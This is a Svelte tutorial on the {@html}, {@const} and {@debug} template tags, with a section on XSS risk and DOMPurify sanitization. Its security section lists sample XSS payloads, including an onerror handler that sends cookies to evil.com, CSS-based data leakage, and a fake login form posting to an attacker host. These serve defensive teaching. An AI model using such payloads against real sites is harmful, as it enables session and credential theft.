# Dynamic HTML and Template Utilities

By default, Svelte escapes all text content to prevent security vulnerabilities. If you have a variable containing `<strong>bold</strong>`, Svelte displays the literal text including the angle brackets — not bold text. This is the correct default behavior because rendering arbitrary HTML from user input is one of the most common attack vectors on the web. But sometimes you genuinely need to render HTML strings — when displaying content from a CMS, rendering markdown, or showing rich text from a trusted API. The `{@html}` tag makes this possible, and understanding when and how to use it safely is essential.

This lesson also covers two other template-level utilities: `{@const}` for local declarations inside template blocks, and `{@debug}` for development-time debugging. Together with `{@html}`, these three tags complete your toolkit for working with dynamic content in Svelte templates.

## The {@html} Tag

Use `{@html expression}` to render a string as HTML instead of escaped text:

```svelte
<script lang="ts">
  const richContent = `
    <h2>Welcome to the Blog</h2>
    <p>This content has <strong>bold text</strong> and <em>italic text</em>.</p>
    <ul>
      <li>First item</li>
      <li>Second item</li>
    </ul>
  `;
</script>

<!-- Without @html — renders as plain text with visible tags -->
<div>{richContent}</div>

<!-- With @html — renders as actual HTML elements -->
<div>{@html richContent}</div>
```

The first `div` displays the raw `<h2>`, `<p>`, and `<strong>` tags as literal text. The second renders them as actual HTML elements with proper formatting.

### How {@html} Works Internally

When Svelte encounters `{@html}`, it sets the element's `innerHTML` property. This means:

- The HTML is parsed by the browser's HTML parser — all valid HTML works
- Script tags are not executed (the browser's `innerHTML` security policy prevents this)
- But event handler attributes like `onerror` on `<img>` tags still execute
- The content is not processed by Svelte's compiler — no reactivity, no component instantiation, no scoped styles
- When the expression value changes, the entire innerHTML is replaced (not diffed)

This last point has a performance implication: if you have a large HTML string that changes frequently, every change replaces the entire DOM subtree. For most use cases (CMS content, markdown) this is fine because the content changes infrequently.

## Security: Cross-Site Scripting (XSS)

The `{@html}` tag renders whatever HTML string you give it. This creates a **Cross-Site Scripting (XSS)** vulnerability if the HTML comes from user input or any untrusted source:

```svelte
<script lang="ts">
  // DANGEROUS: Never render untrusted input with @html!
  let userInput = $state('');
</script>

<input bind:value={userInput} placeholder="Type something..." />

<!-- An attacker could type: <img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie"> -->
<div>{@html userInput}</div>
```

Even though `<script>` tags are not executed via `innerHTML`, there are many other attack vectors:

```html
<!-- Event handlers execute -->
<img src=x onerror="alert('XSS')">

<!-- SVG with embedded script -->
<svg onload="alert('XSS')">

<!-- CSS injection can exfiltrate data -->
<style>input[value^="p"] { background: url('https://evil.com/log?char=p') }</style>

<!-- Link injection for phishing -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- Form injection to capture credentials -->
<form action="https://evil.com/steal"><input name="password" type="password"><button>Login</button></form>
```

**The rule is absolute: never use `{@html}` with untrusted content unless you sanitize it first.**

## Sanitizing HTML with DOMPurify

DOMPurify is the gold standard library for HTML sanitization. It strips dangerous elements and attributes while preserving safe formatting:

```bash
npm install dompurify
npm install -D @types/dompurify
```

```svelte
<!-- src/lib/components/SafeHtml.svelte -->
<script lang="ts">
  import DOMPurify from 'dompurify';

  interface Props {
    content: string;
    class?: string;
    allowedTags?: string[];
  }

  let { content, class: className = '', allowedTags }: Props = $props();

  let cleanHtml = $derived.by(() => {
    const config: DOMPurify.Config = {};

    if (allowedTags) {
      config.ALLOWED_TAGS = allowedTags;
    }

    return DOMPurify.sanitize(content, config);
  });
</script>

<div class={className}>
  {@html cleanHtml}
</div>
```

```svelte
<!-- Usage -->
<script lang="ts">
  import SafeHtml from '$lib/components/SafeHtml.svelte';

  // Even if this contains malicious content, it is safe
  const userGeneratedHtml = `
    <p>Hello world!</p>
    <img src=x onerror="alert('xss')">
    <script>alert('evil')</script>
    <strong>Bold text</strong>
  `;
</script>

<!-- Renders: <p>Hello world!</p> <img src="x"> <strong>Bold text</strong> -->
<!-- The onerror handler and script tag are stripped -->
<SafeHtml content={userGeneratedHtml} />

<!-- Restrict to only basic formatting tags -->
<SafeHtml
  content={userGeneratedHtml}
  allowedTags={['p', 'strong', 'em', 'a', 'ul', 'ol', 'li']}
/>
```

### DOMPurify Configuration Options

DOMPurify is highly configurable. Here are the most useful options:

```typescript
// Allow specific tags and attributes
DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p', 'strong', 'em', 'a', 'h1', 'h2', 'h3', 'ul', 'ol', 'li', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'target', 'rel', 'class']
});

// Remove all tags, keep text only
DOMPurify.sanitize(html, { ALLOWED_TAGS: [] });

// Allow data attributes
DOMPurify.sanitize(html, {
  ALLOWED_ATTR: ['data-*', 'class', 'id']
});

// Force all links to open in new tab
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});
```

### SSR Considerations for DOMPurify

DOMPurify requires a DOM environment. During SSR, there is no `window` or `document`. You have two options:

**Option 1: Sanitize on the server in your load function (recommended)**

```typescript
// src/routes/blog/[slug]/+page.server.ts
import type { PageServerLoad } from './$types';
import { JSDOM } from 'jsdom';
import DOMPurify from 'dompurify';

const window = new JSDOM('').window;
const purify = DOMPurify(window);

export const load: PageServerLoad = async ({ params }) => {
  const post = await getPost(params.slug);

  return {
    title: post.title,
    // Sanitize on the server — the component receives clean HTML
    htmlContent: purify.sanitize(post.rawHtml)
  };
};
```

**Option 2: Use `isomorphic-dompurify`**

```bash
npm install isomorphic-dompurify
```

```typescript
import DOMPurify from 'isomorphic-dompurify';
// Works in both Node.js and browser environments
const clean = DOMPurify.sanitize(dirtyHtml);
```

## Rendering Markdown Content

One of the most common use cases for `{@html}` is rendering markdown. The pattern is to convert markdown to HTML on the server, then render the sanitized HTML in the component:

```bash
npm install marked
npm install -D @types/marked
```

```typescript
// src/routes/blog/[slug]/+page.server.ts
import type { PageServerLoad } from './$types';
import { error } from '@sveltejs/kit';
import { marked } from 'marked';

// Configure marked for security and features
marked.setOptions({
  gfm: true,        // GitHub Flavored Markdown
  breaks: true       // Convert \n to <br>
});

export const load: PageServerLoad = async ({ params }) => {
  const post = await getPostBySlug(params.slug);

  if (!post) {
    throw error(404, 'Post not found');
  }

  // Convert markdown to HTML on the server
  const htmlContent = await marked(post.markdownContent);

  return {
    title: post.title,
    excerpt: post.excerpt,
    publishedAt: post.publishedAt,
    author: post.author,
    htmlContent
  };
};
```

```svelte
<!-- src/routes/blog/[slug]/+page.svelte -->
<script lang="ts">
  let { data } = $props();
</script>

<svelte:head>
  <title>{data.title}</title>
  <meta name="description" content={data.excerpt} />
</svelte:head>

<article class="prose">
  <header>
    <h1>{data.title}</h1>
    <div class="meta">
      <span>{data.author}</span>
      <time datetime={data.publishedAt}>{data.publishedAt}</time>
    </div>
  </header>

  <div class="content">
    {@html data.htmlContent}
  </div>
</article>

<style>
  .prose :global(h2) {
    font-size: 1.5rem;
    font-weight: 700;
    margin-top: 2.5rem;
    margin-bottom: 0.75rem;
    line-height: 1.3;
  }

  .prose :global(h3) {
    font-size: 1.25rem;
    font-weight: 600;
    margin-top: 2rem;
    margin-bottom: 0.5rem;
  }

  .prose :global(p) {
    line-height: 1.75;
    margin-bottom: 1.25rem;
  }

  .prose :global(a) {
    color: var(--color-primary, #3b82f6);
    text-decoration: underline;
    text-underline-offset: 2px;
  }

  .prose :global(a:hover) {
    color: var(--color-primary-dark, #2563eb);
  }

  .prose :global(code) {
    background: #f1f5f9;
    padding: 0.2em 0.4em;
    border-radius: 4px;
    font-size: 0.875em;
    font-family: 'Fira Code', monospace;
  }

  .prose :global(pre) {
    background: #1e293b;
    color: #e2e8f0;
    padding: 1.25rem;
    border-radius: 8px;
    overflow-x: auto;
    margin: 1.5rem 0;
    line-height: 1.6;
  }

  .prose :global(pre code) {
    background: transparent;
    padding: 0;
    border-radius: 0;
    font-size: 0.875rem;
    color: inherit;
  }

  .prose :global(blockquote) {
    border-left: 4px solid #3b82f6;
    padding-left: 1rem;
    margin: 1.5rem 0;
    color: #64748b;
    font-style: italic;
  }

  .prose :global(img) {
    max-width: 100%;
    height: auto;
    border-radius: 8px;
    margin: 1.5rem 0;
  }

  .prose :global(ul),
  .prose :global(ol) {
    padding-left: 1.5rem;
    margin-bottom: 1.25rem;
  }

  .prose :global(li) {
    margin-bottom: 0.5rem;
    line-height: 1.75;
  }

  .prose :global(table) {
    width: 100%;
    border-collapse: collapse;
    margin: 1.5rem 0;
  }

  .prose :global(th),
  .prose :global(td) {
    border: 1px solid #e2e8f0;
    padding: 0.75rem;
    text-align: left;
  }

  .prose :global(th) {
    background: #f8fafc;
    font-weight: 600;
  }

  .prose :global(hr) {
    border: none;
    border-top: 1px solid #e2e8f0;
    margin: 2rem 0;
  }
</style>
```

Notice the `:global()` modifier in the styles. Since `{@html}` content is injected at runtime, Svelte's scoped style system does not know about the elements inside it. Without `:global()`, the scoped class names would not match and the styles would not apply. By wrapping the selectors in `:global()` inside a scoped parent (`.prose`), you style the injected HTML while keeping styles contained to that wrapper — they do not leak to other parts of the page.

### Advanced Markdown: Custom Renderers

The `marked` library lets you customize how each markdown element is rendered:

```typescript
// src/lib/server/markdown.ts
import { marked, type Tokens } from 'marked';

// Custom renderer for enhanced output
const renderer = new marked.Renderer();

// Add target="_blank" to external links
renderer.link = ({ href, title, text }: Tokens.Link) => {
  const isExternal = href.startsWith('http');
  const attrs = isExternal
    ? ' target="_blank" rel="noopener noreferrer"'
    : '';
  const titleAttr = title ? ` title="${title}"` : '';
  return `<a href="${href}"${titleAttr}${attrs}>${text}</a>`;
};

// Add copy button placeholder to code blocks
renderer.code = ({ text, lang }: Tokens.Code) => {
  const language = lang ?? 'text';
  return `
    <div class="code-block" data-language="${language}">
      <div class="code-header">
        <span class="code-language">${language}</span>
      </div>
      <pre><code class="language-${language}">${text}</code></pre>
    </div>
  `;
};

// Add IDs to headings for anchor links
renderer.heading = ({ text, depth }: Tokens.Heading) => {
  const slug = text.toLowerCase().replace(/[^\w]+/g, '-');
  return `<h${depth} id="${slug}"><a href="#${slug}" class="anchor">#</a> ${text}</h${depth}>`;
};

marked.use({ renderer });

export function renderMarkdown(markdown: string): string {
  return marked(markdown) as string;
}
```

## Rendering Rich Text from APIs

CMS platforms like Contentful, Sanity, and Strapi return content in various formats. Here is how to handle the common patterns:

### HTML from a CMS

```typescript
// src/routes/page/[slug]/+page.server.ts
import type { PageServerLoad } from './$types';
import { JSDOM } from 'jsdom';
import DOMPurify from 'dompurify';

const window = new JSDOM('').window;
const purify = DOMPurify(window);

export const load: PageServerLoad = async ({ params, fetch }) => {
  const response = await fetch(`https://cms.example.com/api/pages/${params.slug}`);
  const page = await response.json();

  return {
    title: page.title,
    // Always sanitize CMS content — even "trusted" sources can be compromised
    content: purify.sanitize(page.htmlContent, {
      ALLOWED_TAGS: [
        'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'strong', 'em', 'a', 'img', 'ul', 'ol', 'li',
        'blockquote', 'pre', 'code', 'table', 'thead',
        'tbody', 'tr', 'th', 'td', 'figure', 'figcaption',
        'br', 'hr', 'div', 'span'
      ],
      ALLOWED_ATTR: [
        'href', 'src', 'alt', 'title', 'class', 'id',
        'target', 'rel', 'width', 'height', 'loading'
      ]
    })
  };
};
```

### Rich Text (Structured Content)

Some CMS platforms return structured content (like Contentful's Rich Text or Sanity's Portable Text) instead of HTML. You convert it to HTML on the server:

```typescript
// src/routes/article/[slug]/+page.server.ts
import type { PageServerLoad } from './$types';
import { documentToHtmlString } from '@contentful/rich-text-html-renderer';
import { BLOCKS, INLINES } from '@contentful/rich-text-types';

const renderOptions = {
  renderNode: {
    [BLOCKS.EMBEDDED_ASSET]: (node: any) => {
      const { url, title } = node.data.target.fields.file;
      return `<img src="${url}" alt="${title}" loading="lazy" />`;
    },
    [INLINES.HYPERLINK]: (node: any) => {
      const url = node.data.uri;
      const text = node.content[0].value;
      return `<a href="${url}" target="_blank" rel="noopener">${text}</a>`;
    }
  }
};

export const load: PageServerLoad = async ({ params }) => {
  const article = await getArticle(params.slug);

  return {
    title: article.fields.title,
    content: documentToHtmlString(article.fields.body, renderOptions)
  };
};
```

## Styling {@html} Content

Since `{@html}` content bypasses Svelte's scoped styles, you need the `:global()` modifier. The pattern is to wrap the content in a container and scope all global selectors to that container:

```svelte
<div class="rendered-content">
  {@html data.htmlContent}
</div>

<style>
  .rendered-content {
    max-width: 65ch;
    margin: 0 auto;
  }

  /* :global() inside a scoped parent — styles only apply within .rendered-content */
  .rendered-content :global(h1) { font-size: 2rem; margin-top: 3rem; }
  .rendered-content :global(h2) { font-size: 1.5rem; margin-top: 2.5rem; }
  .rendered-content :global(a) { color: var(--color-primary); }
  .rendered-content :global(img) { max-width: 100%; border-radius: 8px; }
</style>
```

Without the `.rendered-content` parent, `:global(h1)` would style every `<h1>` on the entire page. The scoped parent keeps the global styles contained.

## The {@const} Tag

The `{@const}` tag declares a local constant inside a template block. It is useful for computing derived values within `{#each}`, `{#if}`, `{#snippet}`, and other block contexts without cluttering your `<script>` section:

```svelte
<script lang="ts">
  interface Product {
    name: string;
    price: number;
    quantity: number;
    discount: number; // percentage
  }

  let products: Product[] = [
    { name: 'Widget', price: 29.99, quantity: 3, discount: 10 },
    { name: 'Gadget', price: 49.99, quantity: 1, discount: 0 },
    { name: 'Doohickey', price: 14.99, quantity: 5, discount: 25 }
  ];
</script>

<table>
  <thead>
    <tr>
      <th>Product</th>
      <th>Price</th>
      <th>Qty</th>
      <th>Discount</th>
      <th>Line Total</th>
    </tr>
  </thead>
  <tbody>
    {#each products as product}
      {@const subtotal = product.price * product.quantity}
      {@const discountAmount = subtotal * (product.discount / 100)}
      {@const lineTotal = subtotal - discountAmount}

      <tr>
        <td>{product.name}</td>
        <td>${product.price.toFixed(2)}</td>
        <td>{product.quantity}</td>
        <td>
          {#if product.discount > 0}
            {product.discount}% (-${discountAmount.toFixed(2)})
          {:else}
            —
          {/if}
        </td>
        <td>${lineTotal.toFixed(2)}</td>
      </tr>
    {/each}
  </tbody>
</table>
```

Without `{@const}`, you would either compute these values in the `<script>` block (creating a separate derived array) or duplicate the calculation in multiple places in the template. `{@const}` keeps the calculation right next to where it is used.

### {@const} in Conditional Blocks

```svelte
{#if user}
  {@const fullName = `${user.firstName} ${user.lastName}`}
  {@const initials = `${user.firstName[0]}${user.lastName[0]}`}

  <div class="user-card">
    <div class="avatar">{initials}</div>
    <h3>{fullName}</h3>
    <p>{user.email}</p>
  </div>
{/if}
```

### {@const} in Snippets

```svelte
{#snippet orderRow(order: Order)}
  {@const total = order.items.reduce((sum, i) => sum + i.price * i.quantity, 0)}
  {@const itemCount = order.items.reduce((sum, i) => sum + i.quantity, 0)}
  {@const isLargeOrder = total > 100}

  <tr class:large-order={isLargeOrder}>
    <td>#{order.id}</td>
    <td>{itemCount} items</td>
    <td class:highlight={isLargeOrder}>${total.toFixed(2)}</td>
    <td>{order.status}</td>
  </tr>
{/snippet}
```

### {@const} Rules

- `{@const}` creates an immutable binding — you cannot reassign it
- It must appear at the top of its containing block (before any elements)
- It can reference other `{@const}` declarations from the same block
- It can reference variables from enclosing scopes

## The {@debug} Tag

The `{@debug}` tag triggers the browser's debugger when the specified values change. It is the template equivalent of `console.log` combined with a `debugger` statement — but smarter, because it only pauses when the values actually change:

```svelte
<script lang="ts">
  let count = $state(0);
  let name = $state('Alice');
</script>

<!-- Pauses the debugger whenever count or name changes -->
{@debug count, name}

<h1>{name}: {count}</h1>
<button onclick={() => count++}>Increment</button>
```

When the debugger pauses, you can inspect all variables in scope, examine the component's state, and step through the update process.

### Using {@debug} Effectively

```svelte
<script lang="ts">
  let { data } = $props();
  let selectedId = $state<string | null>(null);
</script>

<!-- Debug specific values you are investigating -->
{@debug selectedId}

{#each data.items as item}
  <!-- Debug inside loops to inspect each iteration -->
  {#if item.id === selectedId}
    {@debug item}
    <div class="selected">{item.name}</div>
  {/if}
{/each}
```

### {@debug} Without Arguments

Using `{@debug}` with no arguments pauses the debugger unconditionally on every render. This is useful when you want to inspect the full component state:

```svelte
<!-- Pauses on every render — use sparingly -->
{@debug}

<div>{someValue}</div>
```

### Important {@debug} Behavior

- `{@debug}` only works when the browser DevTools are open. If DevTools are closed, it does nothing
- In production builds, `{@debug}` is stripped out — it has zero runtime cost in production
- Unlike `console.log`, `{@debug}` pauses execution so you can inspect the full state at that moment
- You can put `{@debug}` inside `{#if}`, `{#each}`, and `{#snippet}` blocks to debug conditionally

## Complete Example: Blog with Markdown, Syntax Highlighting, and CMS Content

Here is a complete blog implementation that ties together all the concepts from this lesson:

```typescript
// src/lib/server/markdown.ts
import { marked } from 'marked';

marked.setOptions({
  gfm: true,
  breaks: true
});

export async function renderMarkdown(content: string): Promise<string> {
  return marked(content) as string;
}
```

```typescript
// src/routes/blog/[slug]/+page.server.ts
import type { PageServerLoad } from './$types';
import { error } from '@sveltejs/kit';
import { renderMarkdown } from '$lib/server/markdown';

interface BlogPost {
  slug: string;
  title: string;
  excerpt: string;
  markdownContent: string;
  author: { name: string; avatar: string };
  publishedAt: string;
  tags: string[];
  readingTime: number;
}

async function getPost(slug: string): Promise<BlogPost | null> {
  // In production, this would query a database or CMS
  const posts: Record<string, BlogPost> = {
    'svelte-5-guide': {
      slug: 'svelte-5-guide',
      title: 'The Complete Guide to Svelte 5',
      excerpt: 'Everything you need to know about Svelte 5 runes, snippets, and reactivity.',
      markdownContent: `
## Introduction

Svelte 5 introduces a fundamentally new reactivity model based on **runes**.

### What Are Runes?

Runes are special symbols that the Svelte compiler recognizes:

- \`$state\` — declares reactive state
- \`$derived\` — computes derived values
- \`$effect\` — runs side effects

\`\`\`typescript
let count = $state(0);
let doubled = $derived(count * 2);
\`\`\`

> Runes replace the old \`let\` reactivity from Svelte 4 with explicit, predictable behavior.

### Why the Change?

The old model had surprising edge cases...
      `,
      author: { name: 'Jane Doe', avatar: '/avatars/jane.jpg' },
      publishedAt: '2025-03-15',
      tags: ['svelte', 'tutorial', 'javascript'],
      readingTime: 8
    }
  };

  return posts[slug] ?? null;
}

export const load: PageServerLoad = async ({ params }) => {
  const post = await getPost(params.slug);

  if (!post) {
    throw error(404, `Post "${params.slug}" not found`);
  }

  const htmlContent = await renderMarkdown(post.markdownContent);

  return {
    title: post.title,
    excerpt: post.excerpt,
    author: post.author,
    publishedAt: post.publishedAt,
    tags: post.tags,
    readingTime: post.readingTime,
    htmlContent,
    slug: post.slug
  };
};
```

```svelte
<!-- src/routes/blog/[slug]/+page.svelte -->
<script lang="ts">
  import SEO from '$lib/components/SEO.svelte';

  let { data } = $props();
</script>

<svelte:head>
  <title>{data.title} | My Blog</title>
  <meta name="description" content={data.excerpt} />
  <meta property="og:title" content={data.title} />
  <meta property="og:description" content={data.excerpt} />
  <meta property="og:type" content="article" />
  <meta property="article:published_time" content={data.publishedAt} />
</svelte:head>

{#snippet authorBio(author: { name: string; avatar: string })}
  <div class="author-bio">
    <img src={author.avatar} alt={author.name} class="author-avatar" />
    <div>
      <strong>{author.name}</strong>
      <span class="reading-time">{data.readingTime} min read</span>
    </div>
  </div>
{/snippet}

{#snippet tagList(tags: string[])}
  <div class="tags">
    {#each tags as tag}
      <a href="/blog?tag={tag}" class="tag">#{tag}</a>
    {/each}
  </div>
{/snippet}

<article class="blog-post">
  <header>
    <h1>{data.title}</h1>
    {@render authorBio(data.author)}
    <time datetime={data.publishedAt}>{data.publishedAt}</time>
    {@render tagList(data.tags)}
  </header>

  <div class="prose">
    {@html data.htmlContent}
  </div>

  <footer>
    {@render tagList(data.tags)}
    {@render authorBio(data.author)}
  </footer>
</article>

<style>
  .blog-post {
    max-width: 65ch;
    margin: 0 auto;
    padding: 2rem 1rem;
  }

  .author-bio {
    display: flex;
    align-items: center;
    gap: 0.75rem;
    margin: 1rem 0;
  }

  .author-avatar {
    width: 40px;
    height: 40px;
    border-radius: 50%;
  }

  .reading-time {
    color: #64748b;
    font-size: 0.875rem;
  }

  .tags {
    display: flex;
    gap: 0.5rem;
    flex-wrap: wrap;
  }

  .tag {
    background: #f1f5f9;
    padding: 0.25rem 0.75rem;
    border-radius: 9999px;
    font-size: 0.8125rem;
    text-decoration: none;
    color: #475569;
  }

  .prose :global(h2) {
    font-size: 1.5rem;
    font-weight: 700;
    margin-top: 2.5rem;
    margin-bottom: 0.75rem;
  }

  .prose :global(h3) {
    font-size: 1.25rem;
    font-weight: 600;
    margin-top: 2rem;
  }

  .prose :global(p) {
    line-height: 1.75;
    margin-bottom: 1.25rem;
  }

  .prose :global(code) {
    background: #f1f5f9;
    padding: 0.2em 0.4em;
    border-radius: 4px;
    font-size: 0.875em;
  }

  .prose :global(pre) {
    background: #1e293b;
    color: #e2e8f0;
    padding: 1.25rem;
    border-radius: 8px;
    overflow-x: auto;
    margin: 1.5rem 0;
  }

  .prose :global(pre code) {
    background: transparent;
    padding: 0;
    color: inherit;
  }

  .prose :global(blockquote) {
    border-left: 4px solid #3b82f6;
    padding-left: 1rem;
    color: #64748b;
    font-style: italic;
    margin: 1.5rem 0;
  }

  .prose :global(ul),
  .prose :global(ol) {
    padding-left: 1.5rem;
    margin-bottom: 1.25rem;
  }

  .prose :global(li) {
    margin-bottom: 0.5rem;
    line-height: 1.75;
  }
</style>
```

This example combines snippets (for the author bio and tag list — reused in header and footer), `{@html}` (for the rendered markdown), `<svelte:head>` (for SEO), and `:global()` scoped styles (for the prose content).

## When to Use {@html}

**Good use cases:**
- Rendering markdown converted to HTML (blog posts, documentation)
- Displaying rich text from a CMS (Contentful, Sanity, WordPress)
- Showing pre-sanitized HTML from a trusted API
- Embedding structured data (JSON-LD) in `<svelte:head>`

**Bad use cases:**
- Rendering user input without sanitization (comments, forum posts, profile bios)
- Building dynamic UI — use components and snippets instead
- Displaying content that could be handled with normal Svelte template syntax
- Generating HTML for interactive elements (those elements will not have event handlers)

The key principle: `{@html}` content is inert. Svelte does not process it, does not attach event handlers, and does not make it reactive. If you need interactive content, build it with components.

## Try It

### Exercise 1: Markdown Blog Post
Create a blog post page that loads markdown content from a server load function. Use the `marked` library to convert markdown to HTML on the server. Render it with `{@html}` and add comprehensive prose styles using the `:global()` pattern.

### Exercise 2: Safe User Content
Build a comment section where users can submit comments with basic HTML formatting (bold, italic, links). Use DOMPurify to sanitize the HTML, allowing only `<strong>`, `<em>`, and `<a>` tags. Verify that script tags and event handlers are stripped.

### Exercise 3: {@const} in Practice
Create a product listing with an `{#each}` block. Use `{@const}` to calculate the discounted price, savings amount, and savings percentage for each product. Display all computed values without adding any derived state to the script block.

### Exercise 4: {@debug} Investigation
Create a component with a list of items and a filter input. Add `{@debug}` to track the filter value and the filtered results. Open browser DevTools, type in the filter, and observe when the debugger pauses. Remove the `{@debug}` tags when you are done investigating.

## Key Takeaways

- `{@html string}` renders a string as actual HTML instead of escaped text — the content is set via `innerHTML`
- **Never use `{@html}` with untrusted user input** — it creates XSS vulnerabilities through event handlers, CSS injection, and form injection
- Sanitize untrusted HTML with DOMPurify before rendering — use `isomorphic-dompurify` for SSR compatibility
- Common use cases: markdown rendering, CMS content, trusted API responses
- Style `{@html}` content using `:global()` inside a scoped parent selector to keep styles contained
- Convert markdown to HTML on the server in your load function for the best performance and security
- `{@const}` declares local constants inside template blocks — useful for computed values in `{#each}`, `{#if}`, and `{#snippet}`
- `{@debug variable}` pauses the browser debugger when the variable changes — only works with DevTools open and is stripped from production builds
- `{@html}` content is inert: Svelte does not process it, attach event handlers, or make it reactive — use components for interactive content
